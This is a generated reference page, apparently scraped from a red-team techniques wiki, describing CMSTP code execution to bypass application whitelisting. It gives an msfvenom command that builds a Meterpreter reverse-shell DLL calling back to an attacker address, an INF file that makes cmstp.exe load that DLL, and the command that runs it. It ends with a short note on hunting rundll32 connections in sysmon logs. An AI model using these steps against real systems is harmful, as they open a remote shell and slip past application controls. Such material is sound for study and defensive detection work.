---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# CMSTP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1191-cmstp-code-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1191-cmstp-code-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Generating the a reverse shell payload as a DLL:

## Preserved Body

````markdown
## Execution

Generating the a reverse shell payload as a DLL:
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
```
Creating a file that will be loaded by CSMTP.exe binary that will in turn load our evil.dll:
```csharp
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```
Invoking the payload:

```csharp
PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
```

## Observations

Rundll32 is spawned which then establishes the connection back to the attacker:

![](<../../_assets/cmstp-rundll32.png>)

A very privitive way of hunting for suspicious instances of rundll32 initiating connections would be skimming through the sysmon logs and looking for network connections being established by rundll32 immediately/soon after it had been spawned by cmstp.

Note how the connection was established one second after the process creation. This behaviour depends on what the payload is supposed to do, but if the payload is a reverse shell, it usually attempts connecting back immediately upon execution, which is exactly our case:

![](<../../_assets/cmstp-kibana (1).png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/cmstp.md)

## Evidence Excerpt

````text
_asset_filenames:
- cmstp-kibana (1).png
- cmstp-rundll32.png
_body: "---\ndescription: CMSTP code execution - bypass application whitelisting.\n---\n\n# CMSTP\n\n## Execution\n\nGenerating\
\ the a reverse shell payload as a DLL:\n\n{% code title=\"evil.dll\" %}\n```csharp\nmsfvenom -p windows/x64/meterpreter/reverse_tcp\
\ LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll\n```\n{% endcode %}\n\nCreating a file that will be\
\ loaded by CSMTP.exe binary that will in turn load our evil.dll:\n\n{% code title=\"f.inf\" %}\n```csharp\n[version]\n\
Signature=$chicago$\nAdvancedINF=2.5\n \n[DefaultInstall_SingleUser]\nRegisterOCXs=RegisterOCXSection\n \n[RegisterOCXSection]\n\
````
